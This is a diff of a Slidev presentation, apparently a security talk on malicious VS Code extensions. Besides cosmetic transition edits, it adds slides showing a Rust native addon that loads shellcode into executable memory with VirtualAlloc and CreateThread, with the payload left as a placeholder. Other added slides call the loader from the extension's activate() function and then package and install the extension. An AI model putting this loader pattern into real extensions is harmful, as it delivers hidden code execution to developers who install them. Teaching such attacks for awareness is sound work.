@@ -1061,7 +1061,7 @@ layout: two-cols
 </div>
 
 ---
-transition: fade-in
+transition: fade-out
 layout: center
 ---
 
@@ -1073,7 +1073,7 @@ layout: center
 </div>
 
 ---
-transition: fade-in
+transition: fade-out
 layout: center
 ---
 
@@ -1429,7 +1429,7 @@ layout: two-cols
 .slidev-code, .slidev-code * { font-size: 0.55rem !important; line-height: 0.85rem !important; }
 </style>
 
-```json
+```json {2|5|6-8|12|13|14-19}
 {
   "name": "demoextension",
   "displayName": "DemoExtension",
@@ -1467,10 +1467,22 @@ layout: two-cols
 
 ---
 transition: fade-out
+layout: two-cols
 ---
 
+<div class="h-full flex items-center">
 
-```js
+## extension.js
+
+</div>
+
+::right::
+
+<style scoped>
+.slidev-code, .slidev-code * { font-size: 0.55rem !important; line-height: 0.85rem !important; }
+</style>
+
+```js {1-3|7-28|29-31|32-}
 // The module 'vscode' contains the VS Code extensibility API
 // Import the module and reference it with the alias vscode in your code below
 const vscode = require('vscode');
@@ -1509,6 +1521,91 @@ module.exports = {
 }
 ```
 
+---
+transition: fade-out
+layout: center
+---
+
+# Updating our addon real quick
+
+```rust
+// Remember to add winapi to Cargo.toml
+use winapi::um::memoryapi::VirtualAlloc;
+use winapi::um::processthreadsapi::CreateThread;
+use winapi::um::synchapi::WaitForSingleObject;
+use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
+use std::ptr::null_mut;
+
+#[neon::export]
+fn hello()  {
+    let x64shellcode: [u8; 433] = [
+      // Evil shellcode
+    ];
+
+    unsafe {
+        let func_addr = VirtualAlloc(null_mut(), x64shellcode.len(), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        std::ptr::copy_nonoverlapping(x64shellcode.as_ptr(), func_addr as *mut u8, x64shellcode.len());
+
+        let mut thread_id: u32 = 0; 
+        let h_thread = CreateThread(null_mut(), 0, Some(std::mem::transmute(func_addr)), null_mut(), 0, &mut thread_id as *mut u32);
+
+        WaitForSingleObject(h_thread, 0xFFFFFFFF);
+    }
+}
+```
+
+---
+transition: fade-out
+layout: center
+---
+
+# Updating `extension.js`
+
+```js
+function activate(context) {
+  require("./index.node").hello();
+  ...
+}
+```
+
+<br />
+
+# Build the extension
+
+```bash
+$ vsce package --allow-missing-repository --skip-license
+$ code --install-extension demoextension-0.0.1.vsix
+```
+
+---
+transition: fade-out
+layout: center
+class: text-center
+---
+
+
+![](./imgs/exmsg.png)
+
+---
+transition: fade-out
+layout: center
+class: text-center
+---
+
+## However, no developer will install this (right?)
+
+![](./imgs/demoss.png)
+
+---
+transition: fade-out
+layout: center
+class: text-center
+---
+
+# Time to make it believable
+
+---
+---
 
 ---
 level: 2
@@ -1682,8 +1779,8 @@ You can also add modifiers to change the animation:
     <div class="font-mono text-xs opacity-60 mb-1">v-click.up</div>
     <div>Slide from bottom</div>
   </div>
-  <div v-click.fade-in class="p-3 rounded border border-primary/30 bg-primary/15">
-    <div class="font-mono text-xs opacity-60 mb-1">v-click.fade-in</div>
+  <div v-click.fade-out class="p-3 rounded border border-primary/30 bg-primary/15">
+    <div class="font-mono text-xs opacity-60 mb-1">v-click.fade-out</div>
     <div>Fade in</div>
   </div>
   <div v-click.fade class="p-3 rounded border border-primary/40 bg-primary/20">
